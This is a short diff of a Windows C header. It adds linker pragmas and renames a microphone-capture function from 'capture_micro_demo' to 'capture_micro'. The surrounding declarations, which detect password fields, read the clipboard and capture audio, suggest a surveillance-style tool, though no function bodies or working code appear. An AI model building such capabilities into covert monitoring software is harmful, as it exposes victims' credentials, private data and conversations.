@@ -10,6 +10,8 @@
 #include <winternl.h>
 #include <mmdeviceapi.h>
 #include <audioclient.h>
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "uuid.lib")
 
 typedef struct _RTL_USER_PROCESS_PARAMETERS 
 {
@@ -56,6 +58,6 @@ int is_password_field(HWND hwnd);
 int *allow_app(char *exe);
 void read_clipboard(char *buffer, size_t size);
 
-void capture_micro_demo(void);
+void capture_micro(void);
 int get_buffer(HRESULT *hr, IAudioCaptureClient *captureClient);
 #endif
